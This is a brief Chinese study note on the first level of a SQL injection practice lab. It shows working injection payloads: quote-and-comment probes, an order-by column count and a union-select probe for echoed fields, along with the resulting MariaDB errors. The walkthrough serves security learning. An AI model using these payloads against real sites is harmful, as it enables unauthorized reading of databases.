变量前面加 ?

在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo "<br>"; 表示换行

  1. 输入 ?id=1' and 1=1 --+ 没有报错，返回正确结果
    输入 ?id=10' 报错 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''10'' LIMIT 0,1' at line 1
    输入?id=1' and a=2 --+ 没有正确结果
    经过这三个步骤说明是字符型注入
  2. 使用order by来判断有几个字段
    输入?id=1' order by 4--+ 报错 Unknown column '4' in 'order clause'
    说明有3个字段

  3. LIMIT 0,1 表示结果只显示一行
    输入?id=-1' union select 1,2,3 --+ 看哪个字段可以回显
